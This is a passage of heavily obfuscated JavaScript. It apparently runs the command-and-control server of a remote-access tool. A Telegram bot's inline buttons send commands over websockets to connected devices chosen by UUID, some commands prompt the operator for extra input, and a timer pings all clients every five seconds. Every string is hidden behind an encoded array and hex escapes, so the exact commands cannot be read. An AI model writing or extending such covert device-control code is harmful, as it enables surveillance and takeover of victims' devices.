                  text: _0xdc21[127],
                  callback_data: `${_0xdc21[128]}${_0xeb57xe}${_0xdc21[3]}`
               }, {
                  text: _0xdc21[129],
                  callback_data: `${_0xdc21[130]}${_0xeb57xe}${_0xdc21[3]}`
               }],
               [{
                  text: _0xdc21[131],
                  callback_data: `${_0xdc21[132]}${_0xeb57xe}${_0xdc21[3]}`
               }, {
                  text: _0xdc21[133],
                  callback_data: `${_0xdc21[85]}${_0xeb57xe}${_0xdc21[3]}`
               }],
               [{
                  text: _0xdc21[134],
                  callback_data: `${_0xdc21[135]}${_0xeb57xe}${_0xdc21[3]}`
               }, {
                  text: _0xdc21[136],
                  callback_data: `${_0xdc21[60]}${_0xeb57xe}${_0xdc21[3]}`
               }],
               [{
                  text: _0xdc21[137],
                  callback_data: `${_0xdc21[87]}${_0xeb57xe}${_0xdc21[3]}`
               }, {
                  text: _0xdc21[138],
                  callback_data: `${_0xdc21[139]}${_0xeb57xe}${_0xdc21[3]}`
               }],
               [{
                  text: _0xdc21[140],
                  callback_data: `${_0xdc21[68]}${_0xeb57xe}${_0xdc21[3]}`
               }]
            ]
         },
         parse_mode: _0xdc21[17]
      })
   };
   if (_0xeb57x26 == _0xdc21[142]) {
      appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
         if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
            _0xeb57xd[_0xdc21[6]](_0xdc21[142])
         }
      });
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
         parse_mode: _0xdc21[17],
         "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
            "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
               [_0xdc21[65]],
               [_0xdc21[66]]
            ],
            '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
         }
      })
   };
   if (_0xeb57x26 == _0xdc21[144]) {
      appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
         if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
            _0xeb57xd[_0xdc21[6]](_0xdc21[144])
         }
      });
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
         parse_mode: _0xdc21[17],
         "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
            "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
               [_0xdc21[65]],
               [_0xdc21[66]]
            ],
            '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
         }
      })
   };
   if (_0xeb57x26 == _0xdc21[145]) {
      appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
         if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
            _0xeb57xd[_0xdc21[6]](_0xdc21[145])
         }
      });
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
         parse_mode: _0xdc21[17],
         "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
            "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
               [_0xdc21[65]],
               [_0xdc21[66]]
            ],
            '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
         }
      })
   };
   if (_0xeb57x26 == _0xdc21[146]) {
      appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
         if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
            _0xeb57xd[_0xdc21[6]](_0xdc21[146])
         }
      });
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
         parse_mode: _0xdc21[17],
         "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
            "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
               [_0xdc21[65]],
               [_0xdc21[66]]
            ],
            '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
         }
      })
   };
   if (_0xeb57x26 == _0xdc21[147]) {
      appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
         if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
            _0xeb57xd[_0xdc21[6]](_0xdc21[147])
         }
      });
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
         parse_mode: _0xdc21[17],
         "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
            "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
               [_0xdc21[65]],
               [_0xdc21[66]]
            ],
            '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
         }
      })
   };
   if (_0xeb57x26 == _0xdc21[148]) {
      appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
         if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
            _0xeb57xd[_0xdc21[6]](_0xdc21[148])
         }
      });
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
         parse_mode: _0xdc21[17],
         "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
            "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
               [_0xdc21[65]],
               [_0xdc21[66]]
            ],
            '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
         }
      })
   };
   if (_0xeb57x26 == _0xdc21[149]) {
      appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
         if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
            _0xeb57xd[_0xdc21[6]](_0xdc21[149])
         }
      });
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
         parse_mode: _0xdc21[17],
         "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
            "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
               [_0xdc21[65]],
               [_0xdc21[66]]
            ],
            '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
         }
      })
   };
   if (_0xeb57x26 == _0xdc21[150]) {
      appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
         if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
            _0xeb57xd[_0xdc21[6]](_0xdc21[150])
         }
      });
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
         parse_mode: _0xdc21[17],
         "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
            "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
               [_0xdc21[65]],
               [_0xdc21[66]]
            ],
            '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
         }
      })
   };
   if (_0xeb57x26 == _0xdc21[151]) {
      appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
         if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
            _0xeb57xd[_0xdc21[6]](_0xdc21[151])
         }
      });
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
         parse_mode: _0xdc21[17],
         "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
            "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
               [_0xdc21[65]],
               [_0xdc21[66]]
            ],
            '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
         }
      })
   };
   if (_0xeb57x26 == _0xdc21[152]) {
      appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
         if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
            _0xeb57xd[_0xdc21[6]](_0xdc21[152])
         }
      });
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
         parse_mode: _0xdc21[17],
         "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
            "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
               [_0xdc21[65]],
               [_0xdc21[66]]
            ],
            '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
         }
      })
   };
   if (_0xeb57x26 == _0xdc21[153]) {
      appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
         if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
            _0xeb57xd[_0xdc21[6]](_0xdc21[153])
         }
      });
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
         parse_mode: _0xdc21[17],
         "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
            "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
               [_0xdc21[65]],
               [_0xdc21[66]]
            ],
            '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
         }
      })
   };
   if (_0xeb57x26 == _0xdc21[154]) {
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[155] + _0xdc21[156], {
         reply_markup: {
            force_reply: true
         }
      });
      currentUuid = _0xeb57xe
   };
   if (_0xeb57x26 == _0xdc21[157]) {
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[158] + _0xdc21[58], {
         reply_markup: {
            force_reply: true
         }
      });
      currentUuid = _0xeb57xe
   };
   if (_0xeb57x26 == _0xdc21[9]) {
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[159] + _0xdc21[160], {
         reply_markup: {
            force_reply: true
         },
         parse_mode: _0xdc21[17]
      });
      currentUuid = _0xeb57xe
   };
   if (_0xeb57x26 == _0xdc21[161]) {
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[162] + _0xdc21[163], {
         reply_markup: {
            force_reply: true
         },
         parse_mode: _0xdc21[17]
      });
      currentUuid = _0xeb57xe
   };
   if (_0xeb57x26 == _0xdc21[164]) {
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[165] + _0xdc21[166], {
         reply_markup: {
            force_reply: true
         },
         parse_mode: _0xdc21[17]
      });
      currentUuid = _0xeb57xe
   };
   if (_0xeb57x26 == _0xdc21[167]) {
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[168] + _0xdc21[169], {
         reply_markup: {
            force_reply: true
         },
         parse_mode: _0xdc21[17]
      });
      currentUuid = _0xeb57xe
   };
   if (_0xeb57x26 == _0xdc21[170]) {
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[171] + _0xdc21[172], {
         reply_markup: {
            force_reply: true
         },
         parse_mode: _0xdc21[17]
      });
      currentUuid = _0xeb57xe
   };
   if (_0xeb57x26 == _0xdc21[173]) {
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[174] + _0xdc21[175], {
         reply_markup: {
            force_reply: true
         },
         parse_mode: _0xdc21[17]
      });
      currentUuid = _0xeb57xe
   }
});
setInterval(function () {
   appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
      _0xeb57xd[_0xdc21[6]](_0xdc21[176])
   });
   try {
      axios[_0xdc21[7]](address)[_0xdc21[177]]((_0xeb57x27) => {
         return _0xdc21[3]
      })
   } catch (e) {}
}, 5000);
appServer[_0xdc21[180]](process[_0xdc21[179]][_0xdc21[178]] || 8999)
